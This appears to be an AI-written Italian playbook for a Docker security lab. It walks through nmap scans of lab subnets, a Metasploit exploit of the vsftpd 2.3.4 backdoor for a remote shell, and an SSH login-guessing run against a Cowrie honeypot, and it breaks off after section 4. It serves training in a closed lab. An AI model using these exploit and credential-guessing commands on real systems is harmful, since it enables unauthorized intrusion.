Ecco la guida in formato Markdown, pronta da copiare e incollare su GitHub.

---

# PLAYBOOK - Laboratorio di Cybersecurity con Docker

## Introduzione
Questa guida fornisce istruzioni dettagliate per eseguire una serie di attacchi informatici in un ambiente di laboratorio Docker configurato ad hoc. Ogni sezione copre un attacco specifico, utilizzando container predisposti e strumenti come Metasploit e Nmap. Il laboratorio è progettato per simulare scenari realistici di attacco e fornire esperienza pratica.

### Struttura del Laboratorio
Il laboratorio è composto da diversi container che simulano servizi vulnerabili e configurazioni di rete realistiche. L'ambiente è suddiviso in:
- **Rete Pubblica (172.16.10.0/24)**: Container esposti verso l'esterno.
- **Rete Privata (10.1.0.0/24)**: Container isolati e raggiungibili solo tramite pivoting.

---

## Accesso a Metasploit
Metasploit è uno dei framework più utilizzati per il penetration testing e l’analisi delle vulnerabilità. In questo laboratorio, viene utilizzato sia per la scansione della rete che per l'esecuzione di exploit specifici. La particolarità di questo ambiente è che Metasploit è già installato sui container `attacker` e `attacker-private`, consentendo di lanciare direttamente comandi come `nmap`.

### Avvio di Metasploit:
1. Accedi al container `attacker` o `attacker-private`:
   ```bash
   docker exec -it attacker /bin/bash
   ```
2. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
3. Metasploit è ora pronto all’uso per eseguire scansioni, exploit e altre attività.

---

## 1. Scansione della rete pubblica dal container `attacker`

### Descrizione:
L’obiettivo di questa attività è effettuare una scansione della rete pubblica per identificare i servizi esposti dai container collegati. La rete pubblica è configurata con il subnet `172.16.10.0/24`. La scansione permette di rilevare IP attivi, porte aperte e servizi in ascolto, informazioni fondamentali per pianificare ulteriori attacchi.

**Passaggi:**
1. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
2. Utilizza `nmap` direttamente da Metasploit:
   ```bash
   nmap -sV 172.16.10.0/24
   ```
   - L'opzione `-sV` consente di identificare le versioni dei servizi in ascolto.
3. Analizza i risultati per verificare la presenza di container come FTP, MySQL e SSH Honeypot.

---

## 2. Scansione della rete privata dal container `attacker-private`

### Descrizione:
Poiché la rete privata non è accessibile direttamente dal container `attacker`, utilizziamo il container `attacker-private` per eseguire una scansione. Questo container ha accesso alla rete interna `10.1.0.0/24`, dove si trovano container più protetti, come il server web e il servizio SSH.

**Passaggi:**
1. Accedi al container `attacker-private`:
   ```bash
   docker exec -it attacker-private /bin/bash
   ```
2. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
3. Lancia la scansione della rete privata:
   ```bash
   nmap -sV 10.1.0.0/24
   ```
4. Verifica la presenza di servizi come il server web (`web.euxcorp.com`) e SSH interno.

---

## 3. Attacco FTP (vsftpd 2.3.4) dal container `attacker`

### Descrizione:
Il container FTP utilizza il servizio `vsftpd` versione 2.3.4, noto per una vulnerabilità di backdoor. Quando un utente si autentica con un nome utente contenente uno smiley `:)`, viene aperta una shell remota sulla porta 6200. Questo exploit è una dimostrazione pratica di come un servizio FTP vulnerabile possa esporre il sistema a esecuzione di comandi da remoto.

**Passaggi:**
1. Avvia Metasploit:
   ```bash
   ./msfconsole -r docker/msfconsole.rc -y config/database.yml
   ```
2. Carica il modulo:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```
3. Configura i parametri:
   ```bash
   set RHOSTS 172.16.10.30
   set RPORT 21
   run
   ```
4. Se l'exploit ha successo, otterrai una shell interattiva.

---

## 4. Attacco SSH Honeypot sul container `public.euxcorp.com`

### Descrizione:
Il container `public.euxcorp.com` contiene un honeypot SSH configurato per registrare ogni tentativo di accesso. Questo è utile per monitorare attività sospette e raccogliere informazioni sugli attaccanti.

**Passaggi:**
1. Accedi al container:
   ```bash
   docker exec -it public.euxcorp.com /bin/bash
   ```
2. Verifica i log:
   ```bash
   tail -f /cowrie/var/log/cowrie/cowrie.log
   ```
3. Tenta l’accesso con Metasploit:
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 172.16.10.40
   set RPORT 2222
   set USERNAME admin
   set PASSWORD admin
   run
   ```
4. Controlla i log per visualizzare i tentativi registrati.

---

Continua nella risposta successiva...
